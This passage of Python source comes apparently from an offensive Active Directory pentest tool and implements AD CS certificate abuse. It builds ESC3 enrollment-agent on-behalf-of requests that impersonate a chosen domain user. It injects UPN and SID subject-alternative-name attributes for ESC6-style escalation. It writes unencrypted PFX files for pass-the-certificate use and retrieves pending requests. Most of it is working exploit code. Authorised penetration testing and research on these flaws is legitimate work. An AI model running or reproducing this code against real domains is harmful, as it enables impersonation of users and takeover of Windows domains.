    plain PKCS#7 SignedData.  The structure includes two CMC-specific signed
    attributes:

      * ``szOID_ENROLL_CERTTYPE_EXTENSION`` (1.3.6.1.4.1.311.21.10) — the
        intended client-auth EKU OID.
      * ``szOID_ENROLLMENT_NAME_VALUE_PAIR`` (1.3.6.1.4.1.311.13.2.1) — a
        name/value pair where ``name = 'requestername'`` and ``value`` is the
        DOMAIN\\user we are enrolling on behalf of.

    The signer is the agent certificate's RSA key, signing with SHA-256 (modern
    AD CS rejects SHA-1).  This mirrors certipy's ``create_on_behalf_of`` and
    is the linchpin of an ESC3 chain.
    """
    from asn1crypto import cms as asn1cms
    from asn1crypto import x509 as asn1x509
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives.serialization import pkcs12

    # Load agent identity from the PFX returned by Stage A.
    with open(config.pfx_cred_path, "rb") as fh:
        agent_key, agent_cert, _ = pkcs12.load_key_and_certificates(
            fh.read(),
            config.pfx_cred_pass.encode() if config.pfx_cred_pass else b"",
        )
    if not isinstance(agent_key, rsa.RSAPrivateKey):
        raise TypeError("Agent PFX must contain an RSA private key for ESC3.")

    # Re-encode the agent cert as asn1crypto so the SignerInfo can reuse the
    # signature_algorithm / issuer fields without re-parsing.
    agent_cert_der = agent_cert.public_bytes(
        __import__(
            "cryptography.hazmat.primitives.serialization", fromlist=["Encoding"]
        ).Encoding.DER
    )
    asn1_agent = asn1x509.Certificate.load(agent_cert_der)

    digest_oid_name = "sha256"
    digest_algo = asn1cms.DigestAlgorithm({"algorithm": digest_oid_name})

    # Hash the wrapped CSR — this becomes the CMS message-digest attribute.
    h = hashes.Hash(hashes.SHA256())
    h.update(csr_der)
    csr_digest = h.finalize()

    # Build the EnrollmentNameValuePair (requestername = on_behalf_of).
    from asn1crypto import core as asn1core

    class _EnrollmentNameValuePair(asn1core.Sequence):
        _fields = [
            ("name", asn1core.BMPString),
            ("value", asn1core.BMPString),
        ]

    requester_pair = _EnrollmentNameValuePair(
        {"name": "requestername", "value": config.on_behalf_of or ""}
    )

    signed_attribs = asn1cms.CMSAttributes(
        [
            asn1cms.CMSAttribute(
                {
                    # szOID_ENROLL_CERTTYPE_EXTENSION → client-auth EKU OID
                    "type": "1.3.6.1.4.1.311.21.10",
                    "values": [asn1cms.ObjectIdentifier("1.3.6.1.5.5.7.3.2")],
                }
            ),
            asn1cms.CMSAttribute(
                {"type": "1.3.6.1.4.1.311.13.2.1", "values": [requester_pair]}
            ),
            asn1cms.CMSAttribute({"type": "message_digest", "values": [csr_digest]}),
        ]
    )

    # Sign the DER-encoded signed_attribs with the agent's RSA key (SHA-256).
    attribs_signature = agent_key.sign(
        signed_attribs.dump(), asym_padding.PKCS1v15(), hashes.SHA256()
    )

    issuer_and_serial = asn1cms.IssuerAndSerialNumber(
        {
            "issuer": asn1_agent.issuer,
            "serial_number": asn1_agent.serial_number,
        }
    )

    signer_info = asn1cms.SignerInfo(
        {
            "version": 1,
            "sid": issuer_and_serial,
            "digest_algorithm": digest_algo,
            "signature_algorithm": asn1_agent["signature_algorithm"],
            "signature": attribs_signature,
            "signed_attrs": signed_attribs,
        }
    )

    encap = asn1cms.EncapsulatedContentInfo(
        {"content_type": "data", "content": csr_der}
    )

    signed_data = asn1cms.SignedData(
        {
            "version": 3,
            "digest_algorithms": [digest_algo],
            "encap_content_info": encap,
            "certificates": [asn1cms.CertificateChoices({"certificate": asn1_agent})],
            "signer_infos": [signer_info],
        }
    )

    cmc = asn1cms.ContentInfo({"content_type": "signed_data", "content": signed_data})
    return cmc.dump()


def _looks_like_ip(value: str) -> bool:
    """Cheap IP-vs-hostname check (works for IPv4; IPv6 would land in else)."""
    return is_ip_address(value)


def _resolve_ca_hostname(config: CertRequestConfig) -> Optional[str]:
    """Resolve the CA hostname to use as the Kerberos SPN target.

    Resolution order:
      1. ``config.ca_fqdn`` — explicit override (preferred in restrictive envs).
      2. ``config.ca_host`` if already an FQDN.
      3. Reverse DNS PTR lookup of the CA IP.

    Returns ``None`` only when no hostname can be derived; callers should fall
    back to the IP and accept that Kerberos may fail with KDC_ERR_S_PRINCIPAL_UNKNOWN.
    """
    if config.ca_fqdn:
        return config.ca_fqdn
    if not _looks_like_ip(config.ca_host):
        return config.ca_host
    try:
        import socket

        host, _aliases, _addrs = socket.gethostbyaddr(config.ca_host)
        if host:
            print_info_verbose(f"Resolved CA hostname via PTR: {host}")
            return host
    except Exception as exc:
        print_info_verbose(
            f"PTR lookup failed for {config.ca_host}: {exc} — pass ca_fqdn explicitly"
        )
    return None


async def _connect_icpr(config: CertRequestConfig):
    """Return an authenticated ICPRRPC instance connected via EPM."""
    from aiosmb.commons.connection.factory import SMBConnectionFactory
    from aiosmb.dcerpc.v5.common.connection.authentication import DCERPCAuth
    from aiosmb.dcerpc.v5.connection import DCERPC5Connection
    from aiosmb.dcerpc.v5.interfaces.endpointmgr import EPM
    from aiosmb.dcerpc.v5.interfaces.icprmgr import ICPRRPC

    url = _build_smb_url(config)
    su = SMBConnectionFactory.from_url(url)

    ntlm_to_ip = bool(config.force_ntlm and config.connect_ip)
    if ntlm_to_ip:
        # NTLM-to-IP: connect EPM straight to the operator/env IP — no DNS,
        # no Kerberos SPN. The CA name never has to resolve.
        connect_host = config.connect_ip
    else:
        endpoint = resolve_kerberos_tcp_target(
            target_host=config.ca_host,
            spn_host=_resolve_ca_hostname(config),
            resolver_ip=config.effective_target_kdc_ip or config.effective_auth_kdc_ip,
        )
        connect_host = endpoint.tcp_host or su.get_target().get_hostname_or_ip()

    print_info_verbose("Connecting to CA endpoint...")
    # EPM uses the *target* KDC and *target* domain — the CA lives there and
    # the SPN must resolve under that realm. For NTLM-to-IP the dc_ip/domain
    # hints are irrelevant (no Kerberos), so pass None to avoid a phantom KDC.
    target, err = await EPM.create_target(
        connect_host,
        ICPRRPC().service_uuid,
        dc_ip=None if ntlm_to_ip else config.effective_target_kdc_ip,
        domain=None if ntlm_to_ip else config.effective_target_domain,
    )
    if err is not None:
        raise err

    if not ntlm_to_ip:
        ca_hostname = _resolve_ca_hostname(config)
        if ca_hostname:
            target.hostname = ca_hostname

    gssapi = su.get_credential()
    auth = DCERPCAuth.from_smb_gssapi(gssapi)
    if ntlm_to_ip:
        # Symmetric to the Kerberos extraction below: pull the live NTLM
        # context when the deep-copy left auth.ntlm unset.
        if auth.ntlm is None and gssapi is not None:
            _NTLM_CTX = "NTLMSSP - Microsoft NTLM Security Support Provider"
            try:
                if _NTLM_CTX in gssapi.list_original_conexts():
                    auth.ntlm = gssapi.get_original_context(_NTLM_CTX)
            except Exception:  # noqa: BLE001 — fall back to whatever from_smb_gssapi set
                auth.ntlm = gssapi.authentication_contexts.get(_NTLM_CTX)
    else:
        # Workaround: asyauth _deep_copy_context missing return in if-branch stores None
        # in original_authentication_contexts — pull the live context from authentication_contexts.
        if auth.kerberos is None and gssapi is not None:
            auth.kerberos = gssapi.authentication_contexts.get(
                "MS KRB5 - Microsoft Kerberos 5"
            )
    connection = DCERPC5Connection(auth, target)
    rpc, err = await ICPRRPC.from_rpcconnection(connection, perform_dummy=True)
    if err is not None:
        raise err

    return rpc


# ---------------------------------------------------------------------------
# Public async entry point
# ---------------------------------------------------------------------------


async def _do_request_certificate(
    config: CertRequestConfig, output_dir: Path
) -> CertRequestResult:
    """Core async implementation — call via :func:`request_certificate_native`."""
    from cryptography import x509 as cx509
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives.serialization import (
        NoEncryption,
        pkcs12,
    )
    from cryptography.x509.oid import ExtensionOID

    _render_request_preflight(config)

    print_info_verbose(f"  ▸ Generating RSA-{config.key_size} private key...")
    key = rsa.generate_private_key(public_exponent=0x10001, key_size=config.key_size)

    # CSR construction
    csr_der = _build_csr(config, key)
    if config.on_behalf_of and config.pfx_cred_path:
        csr_der = _build_on_behalf_csr(csr_der, config)

    # Connect and submit
    rpc = await _connect_icpr(config)
    try:
        attrs: dict = {"CertificateTemplate": config.template}
        if config.on_behalf_of:
            attrs["SAN"] = f"upn={config.on_behalf_of}"
        elif config.sid:
            # SID as cert attribute (required for Strong Certificate Binding on patched DCs).
            # Format: SAN:url=tag:microsoft.com,2022-09-14:sid:<SID>
            _SID_URL_PREFIX = "tag:microsoft.com,2022-09-14:sid:"
            _sid_san = f"url={_SID_URL_PREFIX}{config.sid}"
            if config.upn:
                attrs["SAN"] = f"upn={config.upn}&{_sid_san}"
            else:
                attrs["SAN"] = _sid_san
        elif config.upn:
            # ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 — pass UPN as request attribute
            # so the CA policy module picks it up regardless of template SAN settings.
            attrs["SAN"] = f"upn={config.upn}"

        attrs_list: list[str] = [f"{k}:{v}" for k, v in attrs.items()]

        print_info_verbose(f"  ▸ Submitting CSR to [cyan]{config.ca_name}[/]...")
        result, err = await rpc.request_certificate(config.ca_name, csr_der, attrs_list)
        if err is not None:
            raise err
    finally:
        try:
            await rpc.close()
        except Exception:
            pass

    # Installed aiosmb uses 'requestid'/'encodedcert'; source uses 'request_id'/'certificate'.
    request_id = result.get("request_id") or result.get("requestid")
    disposition = result.get("disposition")
    cert_der = result.get("certificate") or result.get("encodedcert")
    if isinstance(cert_der, (bytes,)) and len(cert_der) == 0:
        cert_der = None

    if disposition != _CR_DISP_ISSUED or not cert_der:
        msg = result.get("disposition_message") or f"disposition={disposition}"
        print_warning(f"  ✗ Certificate not issued — {msg}")
        hint = _hint_for_failure(disposition, msg)
        if hint:
            print_info(f"     [dim]hint:[/] {hint}")
        return CertRequestResult(
            success=False,
            request_id=request_id,
            disposition=disposition,
            error=msg,
        )

    # Parse issued cert
    cert = cx509.load_der_x509_certificate(cert_der)
    cert_subject = cert.subject.rfc4514_string()
    cert_serial = f"{cert.serial_number:X}"

    cert_san: Optional[str] = None
    try:
        san_ext = cert.extensions.get_extension_for_oid(
            ExtensionOID.SUBJECT_ALTERNATIVE_NAME
        )
        from asn1crypto import core as asn1core

        for entry in san_ext.value.get_values_for_type(cx509.OtherName):
            if entry.type_id == cx509.ObjectIdentifier(_UPN_OID):
                cert_san = asn1core.UTF8String.load(entry.value).native
                break
    except Exception:
        pass

    # Write PFX — unencrypted, matching certipy's default output convention.
    # Downstream tools (`shell.ptc_certipy`, certipy auth) load these without a
    # password.  The PFX lives in the workspace directory whose ACLs gate
    # access; PFX-level encryption with a synthetic password adds no value
    # here and breaks every existing reader that expects no password.
    output_dir.mkdir(parents=True, exist_ok=True)
    pfx_password = ""
    pfx_name = f"{config.username}_{os.urandom(4).hex()}.pfx"
    pfx_path = output_dir / pfx_name

    pfx_bytes = pkcs12.serialize_key_and_certificates(
        name=config.username.encode(),
        key=key,
        cert=cert,
        cas=None,
        encryption_algorithm=NoEncryption(),
    )
    pfx_path.write_bytes(pfx_bytes)

    _render_request_result(config, cert, cert_serial, cert_subject, cert_san, pfx_path)

    return CertRequestResult(
        success=True,
        pfx_path=pfx_path,
        pfx_password=pfx_password,
        cert_subject=cert_subject,
        cert_san=cert_san,
        cert_serial=cert_serial,
        request_id=request_id,
        disposition=disposition,
    )


async def request_certificate_native(
    config: CertRequestConfig, output_dir: Path
) -> CertRequestResult:
    """Request a certificate via aiosmb MS-ICPR (native async).

    Args:
        config: Enrollment parameters including CA host, template, and auth creds.
        output_dir: Directory where the PFX file will be written on success.

    Returns:
        A :class:`CertRequestResult` with the PFX path and cert metadata on
        success, or an error message on failure.
    """
    try:
        return await _do_request_certificate(config, output_dir)
    except Exception as exc:
        telemetry.capture_exception(exc)
        # Premium failure rendering — classify the exception chain to
        # distinguish lab/network issues (the dominant failure mode for
        # ADCS enrollment) from real ADscan bugs, then render an
        # operator-facing panel with concrete remediation steps.
        classification = _classify_cert_request_failure(exc, config)
        _render_cert_request_failure(classification, config)
        # Debug-level stack trace so operators running with --debug can
        # see the full call chain without polluting the default UX.
        from adscan_internal import print_info_debug as _dbg
        import traceback as _tb
        _dbg(
            "[adcs] cert-request exception:\n"
            + "".join(_tb.format_exception(type(exc), exc, exc.__traceback__))
        )
        return CertRequestResult(success=False, error=classification.technical_label)


# ---------------------------------------------------------------------------
# Pending request retrieval (CA-with-manager-approval / ESC15 follow-up)
# ---------------------------------------------------------------------------


async def _do_retrieve_certificate(
    config: CertRequestConfig, output_dir: Path, request_id: int
) -> CertRequestResult:
    """Fetch an issued cert by request ID via ``ICPRRPC.retrieve_certificate``.

    Used when the CA holds a request as ``pending`` (e.g. manager-approval
    template) — the caller submits, captures the request_id, and re-runs this
    once the request is approved.  No CSR is sent; aiosmb passes an empty
    CSR and forwards the request_id via ``pdwRequestId``.
    """
    from cryptography import x509 as cx509
    from cryptography.hazmat.primitives.serialization import (
        NoEncryption,
        pkcs12,
    )

    rpc = await _connect_icpr(config)
    try:
        if hasattr(rpc, "retrieve_certificate"):
            result, err = await rpc.retrieve_certificate(
                config.ca_name, int(request_id)
            )
            if err is not None:
                raise err
        else:
            # Older aiosmb without retrieve_certificate — call hCertServerRequest directly
            # with an empty CSR and the existing request_id (same semantics).
            from aiosmb.dcerpc.v5.icpr import (
                hCertServerRequest,
                CertServerRequestResponse,
            )

            # CR_IN_RETRIEVEPENDING (0x01) tells the CA to retrieve existing request
            _CR_IN_RETRIEVEPENDING = 0x00000001
            raw, err = await hCertServerRequest(
                rpc.dce,
                config.ca_name,
                b"",
                dwFlags=_CR_IN_RETRIEVEPENDING,
                pdwRequestId=int(request_id),
            )
            if err is not None:
                raise err
            # Convert CertServerRequestResponse to the dict format downstream expects
            if isinstance(raw, CertServerRequestResponse):
                cert_bytes = (
                    b"".join(raw["pctbCert"]["pbData"])
                    if raw["pctbCert"]["cbData"]
                    else b""
                )
                disp_msg_bytes = (
                    b"".join(raw["pctbDispositionMessage"]["pbData"])
                    if raw["pctbDispositionMessage"]["cbData"]
                    else b""
                )
                result = {
                    "request_id": int(raw["pdwRequestId"]),
                    "requestid": int(raw["pdwRequestId"]),
                    "disposition": int(raw["pdwDisposition"]),
                    "certificate": cert_bytes or None,
                    "encodedcert": cert_bytes or None,
                    "disposition_message": disp_msg_bytes.decode(
                        "utf-16-le", errors="replace"
                    ).strip("\x00")
                    if disp_msg_bytes
                    else None,
                }
            else:
                result = raw
    finally:
        try:
            await rpc.close()
        except Exception:
            pass

    disposition = result.get("disposition") if result else None
    cert_der = (result or {}).get("certificate") or (result or {}).get("encodedcert")
    if isinstance(cert_der, (bytes,)) and len(cert_der) == 0:
        cert_der = None

    if disposition != _CR_DISP_ISSUED or not cert_der:
        msg = (result or {}).get("disposition_message") or f"disposition={disposition}"
        print_warning(f"  ✗ Pending request not yet issued — {msg}")
        return CertRequestResult(
            success=False,
            request_id=request_id,
            disposition=disposition,
            error=msg,
        )

    cert = cx509.load_der_x509_certificate(cert_der)
    cert_serial = f"{cert.serial_number:X}"

    output_dir.mkdir(parents=True, exist_ok=True)
    pfx_name = f"{config.username}_retrieved_{request_id}.pfx"
    pfx_path = output_dir / pfx_name
    # The original private key is gone — we only have the issued cert.  Persist
    # it in a PFX container without a key so callers can still load/verify it
    # alongside any side-channel key they kept locally.
    pfx_bytes = pkcs12.serialize_key_and_certificates(
        name=config.username.encode(),
        key=None,
        cert=cert,
        cas=None,
        encryption_algorithm=NoEncryption(),
    )
    pfx_path.write_bytes(pfx_bytes)

    return CertRequestResult(
        success=True,
        pfx_path=pfx_path,
        pfx_password="",
        cert_subject=cert.subject.rfc4514_string(),
        cert_serial=cert_serial,
        request_id=request_id,
        disposition=disposition,
    )


async def retrieve_certificate_native(
    config: CertRequestConfig, output_dir: Path, request_id: int
) -> CertRequestResult:
    """Retrieve a previously-submitted ADCS certificate by request ID.

    Args:
        config: Same enrollment parameters as :func:`request_certificate_native`
            (auth + CA target).  Template/upn/sid are ignored on retrieval.
        output_dir: Directory where the cert-only PFX is written on success.
        request_id: The request ID returned by the original submission.
    """
    try:
        return await _do_retrieve_certificate(config, output_dir, request_id)
    except Exception as exc:
        telemetry.capture_exception(exc)
        # Same premium classification as the submit path — see
        # ``request_certificate_native`` above for the rationale.  The
        # retrieve flow shares the same RPC transport and therefore the
        # same lab/environment failure modes (EPM timeout on port 135,
        # CA host unreachable, etc.).
        classification = _classify_cert_request_failure(exc, config)
        _render_cert_request_failure(classification, config)
        from adscan_internal import print_info_debug as _dbg
        import traceback as _tb
        _dbg(
            "[adcs] cert-retrieve exception:\n"
            + "".join(_tb.format_exception(type(exc), exc, exc.__traceback__))
        )
        return CertRequestResult(success=False, error=classification.technical_label)
